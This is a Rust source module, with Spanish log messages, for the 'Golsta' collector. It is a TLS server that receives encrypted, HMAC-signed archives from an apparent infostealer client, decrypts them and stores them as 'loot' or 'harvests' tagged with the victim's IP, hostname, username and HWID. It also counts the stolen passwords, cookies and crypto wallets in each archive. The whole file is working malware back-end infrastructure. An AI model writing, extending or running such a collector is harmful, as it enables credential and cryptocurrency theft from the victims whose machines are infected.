//! In-process receiver for the Golsta transport.
//!
//! The client artifact is kept unchanged. This module ports the wire contract
//! from Golsta's private server/transport implementation and keeps the
//! received archive behind the existing authenticated C2R2 API.

use ring::{aead, hmac};
use std::collections::BTreeMap;
use std::fs::{self, OpenOptions};
use std::io::{self, Write};
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use tokio::io::AsyncReadExt;
use tokio::net::{TcpListener, TcpStream};
use tokio_rustls::TlsAcceptor;
use tracing::{error, info, warn};

use crate::api::{GolstaHarvest, GolstaHarvestList, GolstaHealth};

const MAGIC: &[u8; 4] = b"GLST";
const PROTO_VERSION: u8 = 1;
const HEADER_SIZE: usize = 61;
const HMAC_SIZE: usize = 32;
const GCM_TAG_SIZE: usize = 16;
const MAX_ARCHIVE_SIZE: usize = 500 * 1024 * 1024;

#[derive(Clone)]
pub struct GolstaStore {
    inner: Arc<Mutex<StoreInner>>,
    loot_dir: Arc<PathBuf>,
}

struct StoreInner {
    next_id: u64,
    archives: BTreeMap<String, PathBuf>,
    harvests: BTreeMap<String, GolstaHarvest>,
}

#[derive(Debug)]
struct ArchiveEntry {
    name: String,
    data: Vec<u8>,
}

impl GolstaStore {
    pub fn new(loot_dir: PathBuf) -> Result<Self, String> {
        fs::create_dir_all(&loot_dir)
            .map_err(|error| format!("No se pudo crear {}: {error}", loot_dir.display()))?;

        Ok(Self {
            inner: Arc::new(Mutex::new(StoreInner {
                next_id: 1,
                archives: BTreeMap::new(),
                harvests: BTreeMap::new(),
            })),
            loot_dir: Arc::new(loot_dir),
        })
    }

    pub fn health(&self) -> GolstaHealth {
        let harvest_count = self
            .inner
            .lock()
            .map(|inner| inner.harvests.len())
            .unwrap_or_default();

        GolstaHealth {
            status: "ok".to_string(),
            service: "golsta".to_string(),
            harvest_count,
        }
    }

    pub fn harvests(&self) -> GolstaHarvestList {
        let harvests = self
            .inner
            .lock()
            .map(|inner| inner.harvests.values().cloned().collect::<Vec<_>>())
            .unwrap_or_default();
        let total = harvests.len();
        GolstaHarvestList { harvests, total }
    }

    pub fn archive(&self, id: &str) -> Result<Option<Vec<u8>>, String> {
        let path = self
            .inner
            .lock()
            .map_err(|_| "Golsta store lock poisoned".to_string())?
            .archives
            .get(id)
            .cloned();

        path.map(|path| {
            fs::read(path).map_err(|error| format!("No se pudo leer el archivo: {error}"))
        })
        .transpose()
    }

    fn ingest(&self, peer: SocketAddr, archive: Vec<u8>) -> Result<GolstaHarvest, String> {
        let entries = parse_zip_entries(&archive)?;
        let metadata = summarize_entries(&entries);

        let sequence = self
            .inner
            .lock()
            .map(|mut inner| {
                let sequence = inner.next_id;
                inner.next_id = inner.next_id.saturating_add(1);
                sequence
            })
            .map_err(|_| "Golsta store lock poisoned".to_string())?;

        let ip = peer.ip().to_string();
        let host = sanitize_component(metadata.hostname.as_deref().unwrap_or("unknown"));
        let user = sanitize_component(metadata.username.as_deref().unwrap_or("unknown"));
        let hwid = sanitize_component(metadata.hwid.as_deref().unwrap_or("unknown"));
        let file_name = format!(
            "XX_{}_{}_{}_{}_{}.zip",
            sanitize_component(&ip),
            host,
            user,
            hwid,
            sequence
        );
        let final_path = self.loot_dir.join(&file_name);
        let temp_path = self.loot_dir.join(format!(".{file_name}.part"));

        write_atomic(&temp_path, &final_path, &archive)?;

        let harvest = GolstaHarvest {
            id: file_name.clone(),
            country: "XX".to_string(),
            ip,
            hostname: metadata.hostname.unwrap_or_else(|| "unknown".to_string()),
            username: metadata.username.unwrap_or_else(|| "unknown".to_string()),
            size_bytes: archive.len() as u64,
            created_at: chrono::Utc::now().to_rfc3339(),
            password_count: metadata.password_count,
            cookie_count: metadata.cookie_count,
            wallet_count: metadata.wallet_count,
        };

        let mut inner = self
            .inner
            .lock()
            .map_err(|_| "Golsta store lock poisoned".to_string())?;
        inner.archives.insert(file_name.clone(), final_path);
        inner.harvests.insert(file_name, harvest.clone());
        Ok(harvest)
    }
}

#[derive(Default)]
struct ArchiveMetadata {
    hostname: Option<String>,
    username: Option<String>,
    hwid: Option<String>,
    password_count: usize,
    cookie_count: usize,
    wallet_count: usize,
}

pub fn parse_secret_hex(value: &str) -> Result<Vec<u8>, String> {
    let value = value.trim();
    if value.is_empty() || value.len() % 2 != 0 {
        return Err("El secreto Golsta debe ser hexadecimal y no vacío".to_string());
    }

    let mut bytes = Vec::with_capacity(value.len() / 2);
    for pair in value.as_bytes().chunks_exact(2) {
        let high =
            hex_value(pair[0]).ok_or_else(|| "Secreto Golsta hexadecimal inválido".to_string())?;
        let low =
            hex_value(pair[1]).ok_or_else(|| "Secreto Golsta hexadecimal inválido".to_string())?;
        bytes.push((high << 4) | low);
    }
    Ok(bytes)
}

fn hex_value(value: u8) -> Option<u8> {
    match value {
        b'0'..=b'9' => Some(value - b'0'),
        b'a'..=b'f' => Some(value - b'a' + 10),
        b'A'..=b'F' => Some(value - b'A' + 10),
        _ => None,
    }
}

pub fn spawn_golsta_collector(
    bind: String,
    port: u16,
    tls_acceptor: TlsAcceptor,
    store: GolstaStore,
    secret: Vec<u8>,
) {
    tokio::spawn(async move {
        let address = format!("{bind}:{port}");
        let listener = match TcpListener::bind(&address).await {
            Ok(listener) => listener,
            Err(error) => {
                error!("No se pudo iniciar el collector Golsta en {address}: {error}");
                return;
            }
        };

        info!("Golsta collector nativo escuchando en {address} (TLS)");
        loop {
            let (stream, peer) = match listener.accept().await {
                Ok(connection) => connection,
                Err(error) => {
                    warn!("Error aceptando conexión Golsta: {error}");
                    continue;
                }
            };

            let acceptor = tls_acceptor.clone();
            let store = store.clone();
            let secret = secret.clone();
            tokio::spawn(async move {
                match acceptor.accept(stream).await {
                    Ok(tls_stream) => {
                        if let Err(error) = receive_archive(tls_stream, peer, store, &secret).await
                        {
                            warn!("Conexión Golsta rechazada desde {peer}: {error}");
                        }
                    }
                    Err(error) => warn!("Handshake TLS Golsta fallido desde {peer}: {error}"),
                }
            });
        }
    });
}

async fn receive_archive(
    mut stream: tokio_rustls::server::TlsStream<TcpStream>,
    peer: SocketAddr,
    store: GolstaStore,
    secret: &[u8],
) -> Result<(), String> {
    let mut header = [0u8; HEADER_SIZE];
    stream
        .read_exact(&mut header)
        .await
        .map_err(|error| format!("cabecera incompleta: {error}"))?;

    if &header[..4] != MAGIC {
        return Err("magic inválido".to_string());
    }
    if header[4] != PROTO_VERSION {
        return Err(format!("versión no soportada: {}", header[4]));
    }

    let ciphertext_len = u32::from_le_bytes(header[57..61].try_into().unwrap()) as usize;
    if ciphertext_len < GCM_TAG_SIZE {
        return Err("ciphertext demasiado corto".to_string());
    }
    if ciphertext_len > MAX_ARCHIVE_SIZE.saturating_add(GCM_TAG_SIZE) {
        return Err(format!("payload demasiado grande: {ciphertext_len} bytes"));
    }

    let mut body = vec![0u8; ciphertext_len + HMAC_SIZE];
    stream
        .read_exact(&mut body)
        .await
        .map_err(|error| format!("cuerpo incompleto: {error}"))?;

    let timestamp = u64::from_le_bytes(header[5..13].try_into().unwrap());
    let archive = decrypt_packet(&header, &body, secret, timestamp)?;
    let harvest = store.ingest(peer, archive)?;
    info!(
        "Golsta recibido: {} ({} bytes)",
        harvest.id, harvest.size_bytes
    );
    Ok(())
}

fn decrypt_packet(
    header: &[u8; HEADER_SIZE],
    body: &[u8],
    secret: &[u8],
    timestamp: u64,
) -> Result<Vec<u8>, String> {
    if body.len() < HMAC_SIZE {
        return Err("HMAC ausente".to_string());
    }

    let transport_key = hmac::Key::new(hmac::HMAC_SHA256, secret);
    let timestamp_bytes = timestamp.to_le_bytes();
    let transport_key = hmac::sign(&transport_key, &timestamp_bytes);
    let ciphertext_len = body.len() - HMAC_SIZE;
    let mut authenticated = Vec::with_capacity(HEADER_SIZE + ciphertext_len);
    authenticated.extend_from_slice(header);
    authenticated.extend_from_slice(&body[..ciphertext_len]);

    let mac_key = hmac::Key::new(hmac::HMAC_SHA256, transport_key.as_ref());
    hmac::verify(&mac_key, &authenticated, &body[ciphertext_len..])
        .map_err(|_| "HMAC inválido".to_string())?;

    let mut session_key = [0u8; 32];
    for (index, byte) in session_key.iter_mut().enumerate() {
        *byte = header[13 + index] ^ transport_key.as_ref()[index];
    }

    let unbound = aead::UnboundKey::new(&aead::AES_256_GCM, &session_key)
        .map_err(|_| "clave AES inválida".to_string())?;
    let key = aead::LessSafeKey::new(unbound);
    let nonce = aead::Nonce::try_assume_unique_for_key(&header[45..57])
        .map_err(|_| "nonce inválido".to_string())?;
    let mut encrypted = body[..ciphertext_len].to_vec();
    let plaintext = key
        .open_in_place(nonce, aead::Aad::empty(), &mut encrypted)
        .map_err(|_| "descifrado AES-GCM fallido".to_string())?;
    Ok(plaintext.to_vec())
}

fn parse_zip_entries(data: &[u8]) -> Result<Vec<ArchiveEntry>, String> {
    if data.len() < 22 {
        return Err("archive demasiado pequeño".to_string());
    }

    let lower_bound = data.len().saturating_sub(65_557);
    let eocd = (lower_bound..=data.len() - 22)
        .rev()
        .find(|&offset| data[offset..offset + 4] == [0x50, 0x4b, 0x05, 0x06])
        .ok_or_else(|| "EOCD no encontrado".to_string())?;

    let entries = u16::from_le_bytes(data[eocd + 10..eocd + 12].try_into().unwrap()) as usize;
    let central_offset =
        u32::from_le_bytes(data[eocd + 16..eocd + 20].try_into().unwrap()) as usize;
    if central_offset > data.len() {
        return Err("offset del directorio central inválido".to_string());
    }

    let mut result = Vec::with_capacity(entries);
    let mut cursor = central_offset;
    for _ in 0..entries {
        if cursor.checked_add(46).is_none() || cursor + 46 > data.len() {
            return Err("directorio central truncado".to_string());
        }
        if data[cursor..cursor + 4] != [0x50, 0x4b, 0x01, 0x02] {
            return Err("entrada central inválida".to_string());
        }

        let flags = u16::from_le_bytes(data[cursor + 8..cursor + 10].try_into().unwrap());
        let method = u16::from_le_bytes(data[cursor + 10..cursor + 12].try_into().unwrap());
        let compressed_size =
            u32::from_le_bytes(data[cursor + 20..cursor + 24].try_into().unwrap()) as usize;
        let name_len =
            u16::from_le_bytes(data[cursor + 28..cursor + 30].try_into().unwrap()) as usize;
        let extra_len =
            u16::from_le_bytes(data[cursor + 30..cursor + 32].try_into().unwrap()) as usize;
        let comment_len =
            u16::from_le_bytes(data[cursor + 32..cursor + 34].try_into().unwrap()) as usize;
        let local_offset =
            u32::from_le_bytes(data[cursor + 42..cursor + 46].try_into().unwrap()) as usize;
        let name_end = cursor
            .checked_add(46)
            .and_then(|value| value.checked_add(name_len))
            .ok_or_else(|| "nombre de entrada inválido".to_string())?;
        if name_end > data.len() {
            return Err("nombre de entrada truncado".to_string());
        }

        let name = String::from_utf8(data[cursor + 46..name_end].to_vec())
            .map_err(|_| "nombre de entrada no UTF-8".to_string())?;
        let next_cursor = name_end
            .checked_add(extra_len)
            .and_then(|value| value.checked_add(comment_len))
            .ok_or_else(|| "entrada central inválida".to_string())?;
        if next_cursor > data.len() {
            return Err("entrada central truncada".to_string());
        }

        if name.ends_with('/') {
            validate_archive_name(name.trim_end_matches('/'))?;
            cursor = next_cursor;
            continue;
        }
        validate_archive_name(&name)?;
        if flags & 1 != 0 || method != 0 {
            return Err("archive comprimido o cifrado no soportado".to_string());
        }

        if local_offset.checked_add(30).is_none() || local_offset + 30 > data.len() {
            return Err("cabecera local inválida".to_string());
        }
        if data[local_offset..local_offset + 4] != [0x50, 0x4b, 0x03, 0x04] {
            return Err("magic local inválido".to_string());
        }
        let local_name_len = u16::from_le_bytes(
            data[local_offset + 26..local_offset + 28]
                .try_into()
                .unwrap(),
        ) as usize;
        let local_extra_len = u16::from_le_bytes(
            data[local_offset + 28..local_offset + 30]
                .try_into()
                .unwrap(),
        ) as usize;
        let content_start = local_offset
            .checked_add(30)
            .and_then(|value| value.checked_add(local_name_len))
            .and_then(|value| value.checked_add(local_extra_len))
            .ok_or_else(|| "contenido local inválido".to_string())?;
        let content_end = content_start
            .checked_add(compressed_size)
            .ok_or_else(|| "contenido local demasiado grande".to_string())?;
        if content_end > data.len() {
            return Err("contenido local truncado".to_string());
        }

        result.push(ArchiveEntry {
            name,
            data: data[content_start..content_end].to_vec(),
        });
        cursor = next_cursor;
    }

    Ok(result)
}

fn validate_archive_name(name: &str) -> Result<(), String> {
    if name.is_empty() || name.starts_with('/') || name.contains('\\') {
        return Err("ruta de archive inválida".to_string());
    }
    if name
        .split('/')
        .any(|part| part.is_empty() || part == "." || part == "..")
    {
        return Err("ruta de archive insegura".to_string());
    }
    Ok(())
}

fn summarize_entries(entries: &[ArchiveEntry]) -> ArchiveMetadata {
    let mut metadata = ArchiveMetadata::default();
    let mut wallet_names = std::collections::BTreeSet::new();

    for entry in entries {
        let lower = entry.name.to_ascii_lowercase();
        if lower == "info.txt" || lower == "system_info.txt" {
            let text = String::from_utf8_lossy(&entry.data);
            for line in text.lines() {
                let Some((key, value)) = line.split_once(':') else {
                    continue;
                };
                let value = value.trim();
                if value.is_empty() {
                    continue;
                }
                match key.trim().to_ascii_lowercase().as_str() {
                    "machine" => metadata.hostname = Some(value.to_string()),
                    "user" => metadata.username = Some(value.to_string()),
                    "hwid" => metadata.hwid = Some(value.to_string()),
                    _ => {}
                }
            }
        }

        if lower.contains("password") {
            metadata.password_count += count_records(&entry.data, b"URL:");
        }
        if lower.contains("cookie") {
            metadata.cookie_count += entry.data.iter().filter(|&&byte| byte == b'\n').count();
        }
        if let Some(rest) = lower.strip_prefix("wallets/") {
            if let Some(wallet) = rest.split('/').next() {
                if !wallet.is_empty() {
                    wallet_names.insert(wallet.to_string());
                }
            }
        }
    }
    metadata.wallet_count = wallet_names.len();
    metadata
}

fn count_records(data: &[u8], prefix: &[u8]) -> usize {
    data.split(|&byte| byte == b'\n')
        .filter(|line| line.starts_with(prefix))
        .count()
}

fn sanitize_component(value: &str) -> String {
    let sanitized: String = value
        .chars()
        .filter(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.')
        })
        .take(64)
        .collect();
    if sanitized.is_empty() {
        "unknown".to_string()
    } else {
        sanitized
    }
}

fn write_atomic(temp_path: &Path, final_path: &Path, data: &[u8]) -> Result<(), String> {
    let mut file = OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(temp_path)
        .map_err(|error| format!("No se pudo crear archivo temporal: {error}"))?;

    if let Err(error) = (|| -> io::Result<()> {
        file.write_all(data)?;
        file.sync_all()?;
        Ok(())
    })() {
        let _ = fs::remove_file(temp_path);
        return Err(format!("No se pudo escribir archive: {error}"));
    }

    drop(file);
    if let Err(error) = fs::rename(temp_path, final_path) {
        let _ = fs::remove_file(temp_path);
        return Err(format!("No se pudo publicar archive: {error}"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use ring::rand::{SecureRandom, SystemRandom};

    #[test]
    fn parses_the_shared_secret_format() {
        assert_eq!(parse_secret_hex("00aF10").unwrap(), [0, 0xaf, 0x10]);
        assert!(parse_secret_hex("abc").is_err());
        assert!(parse_secret_hex("zz").is_err());
    }

    #[test]
    fn rejects_unsafe_archive_names() {
        assert!(validate_archive_name("raw/info.txt").is_ok());
        assert!(validate_archive_name("../escape.txt").is_err());
        assert!(validate_archive_name("C:\\escape.txt").is_err());
    }

    #[test]
    fn decrypts_a_golsta_packet() {
        let secret = b"test-secret";
        let timestamp = 42u64;
        let mut session_key = [0u8; 32];
        SystemRandom::new().fill(&mut session_key).unwrap();
        let nonce_bytes = [7u8; 12];
        let key = aead::LessSafeKey::new(
            aead::UnboundKey::new(&aead::AES_256_GCM, &session_key).unwrap(),
        );
        let mut ciphertext = b"PK\x03\x04 synthetic archive".to_vec();
        let nonce = aead::Nonce::assume_unique_for_key(nonce_bytes);
        key.seal_in_place_append_tag(nonce, aead::Aad::empty(), &mut ciphertext)
            .unwrap();

        let transport = hmac::sign(
            &hmac::Key::new(hmac::HMAC_SHA256, secret),
            &timestamp.to_le_bytes(),
        );
        let mut header = [0u8; HEADER_SIZE];
        header[..4].copy_from_slice(MAGIC);
        header[4] = PROTO_VERSION;
        header[5..13].copy_from_slice(&timestamp.to_le_bytes());
        for (index, byte) in session_key.iter().enumerate() {
            header[13 + index] = *byte ^ transport.as_ref()[index];
        }
        header[45..57].copy_from_slice(&nonce_bytes);
        header[57..61].copy_from_slice(&(ciphertext.len() as u32).to_le_bytes());
        let mut body = ciphertext;
        let mut signed = header.to_vec();
        signed.extend_from_slice(&body);
        let mac = hmac::sign(
            &hmac::Key::new(hmac::HMAC_SHA256, transport.as_ref()),
            &signed,
        );
        body.extend_from_slice(mac.as_ref());

        assert_eq!(
            decrypt_packet(&header, &body, secret, timestamp).unwrap(),
            b"PK\x03\x04 synthetic archive"
        );
    }
}
